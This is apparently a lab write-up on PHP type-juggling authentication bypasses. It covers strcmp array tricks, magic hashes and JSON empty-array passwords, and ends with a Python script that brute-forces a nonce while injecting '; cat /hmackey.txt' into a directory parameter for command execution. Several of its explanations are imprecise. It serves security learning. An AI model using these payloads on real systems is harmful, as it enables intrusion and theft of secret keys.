# Authentication Bypass via TypeGuggling
Let's discuss about some tips on how we can perform an Authentication bypass via insecure PHP code that takes advantages over TypeGuggling.
## 1)Strcmp Bypass (PHP <8.x)
In this case the password is compared using the string compare function and only if 0=true is returned then the auth will pass.
```
$admin_pw = "P@ssw0rd!";
if(isset($_POST['pw'])){
    if(strcmp($_POST['pw'], $admin_pw) == 0){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```
In this case this can be bypassed by using a array, The string compare will compare array with **pw -> null and null === 0** which will pass the check!
```
POST / HTTP/1.1
Host: typejuggling.htb
Content-Type: application/x-www-form-urlencoded
Content-Length: 8

pw[]=pwn
```

## 2)Magic Hashes
In this more realistic approach the shipped password will be SHA256 encoded and then compared to the hard-coded one!
```
$hashed_password = '0e66298694359207596086558843543959518835691168370379069085301337';
if(isset($_POST['pw']) and is_string($_POST['pw'])){ 
    if(hash('sha256', $_POST['pw']) == $hashed_password){
        // successfully authenticated
        <SNIP>
    } else {
        // invalid credentials
        <SNIP>
    }
}
```
In this case we can bypass this by using a valid magic hash from this repo: https://github.com/spaze/hashes
Since we know that the hardcoded hash start with 0eNUMBERS we can find another hash that starts with 0eNUMBERS example the **SHA256 of 34250003024812 -> 0e46289032038065916139621039085883773413820991920706299695051332** this will pass even if the values of the actual hashes aren't same.
WHY? Because in case of both strings are numeric the interpreter will threath them as numbers instead converting both strigs to **0 === 0 aka true!**


# Attack scenario
Let's take into consideration this code.. We can see a loose comparison on the **login.php** code. Specifically on the password parameters in request body are loose checked for it's sha256 hash-
```
<?php
   require_once ('config.php');
   session_start();

   function pw_hash($password){
    return hash('sha256', $password);
    }

   // parse json body
   $json = file_get_contents('php://input');
   $data = json_decode($json, true);

   // check login
   if(isset($data['username']) and isset($data['password'])){
    $user = get_user($data['username']);

    // implement password hash since it's more secure
    if (pw_hash($data['password']) == $user['password']){
        $_SESSION['username'] = $data['username'];
        $_SESSION['loggedin'] = True;
        echo "Success";
        exit;
    }

    echo "Fail";
    exit;
}

?>
```
### HOW TO ATTACK?
In this case we can see that the code supports the JSON notation, which allows us to circumvent the basic strings!
We can see that the password is hashed via **SHA256!**
We can see that the sen't password is calculating the hash and loose comparing to the password from the shipped user.
So here we need to use a fake account that contains the admin name and use the password void .
```
{"username":"testadmin","password":[]}
```
The reason is becase the Hash of a null array will give back NULL and the second will have []
```
NULL == []  --> TRUE
```


# Advanced Attacks
In this example we can take into consideration a more complex example where a directory listing is applied.
```
<?php

function generate_nonce(){
    return random_int(0, 999999);
}

function custom_hmac($dir, $nonce){
    $key = file_get_contents("/hmackey.txt");
    $length = 10;

    $mac = substr(hash_hmac('md5', "{$dir}||{$nonce}", $key), 0, $length);
    return $mac;
}

function check_hmac($dir, $nonce, $mac) {
    return $mac == custom_hmac($dir, $nonce);
}

function check_dir($dir){
    return shell_exec("ls -la {$dir}");
}

function generate_link($username) {
    $dir = "/home/{$username}/";
    $nonce = generate_nonce();
    $mac = custom_hmac($dir, $nonce);

    return "/dir.php?dir={$dir}&nonce={$nonce}&mac={$mac}";
}

?>
```
In this case the complex part is that a HMAC is calculated out of the directory making it impossible apparently to tamper.
## Attack scenario
The function used to check the HMAC uses a loose check which can be bypassed with 0.
```
function custom_hmac($dir, $nonce){
    return '0e12345678';
}
```
We can inject whatever DIR in the path:
```
<?php
    if(isset($_GET['dir'])) {
        if(check_hmac($_GET['dir'], $_GET['nonce'], $_GET['mac'])) {
            echo nl2br(check_dir($_GET['dir']));
        } else {
            echo '<strong>Error! Invalid MAC</strong>';
        }
    } else {
        $link = generate_link($_SESSION['username']);
        echo "Please check your home directory <a href='{$link}'>here</a>";
    }
?>
```
Knowing this we can use the following script to generate a valid HMAC and gain rce.
```
import requests

URL = "http://94.237.53.3:53673/dir.php"
COOKIES = {"PHPSESSID": "homv8qk8laif901u2j867g5tim"}

DIR = "/home/htb-stdnt/; cat /hmackey.txt"
MAC = 0
MAX_NONCE = 20000

def prepare_params(nonce):
    return {
        "dir": DIR,
        "nonce": nonce,
        "mac": MAC
    }

def make_request(nonce):
    return requests.get(URL, cookies=COOKIES, params=prepare_params(nonce))

# main
for n in range(MAX_NONCE):
    r = make_request(n)

    if not "Error! Invalid MAC" in r.text:
        print("Found valid MAC:")
        print(r.url)
        break

```
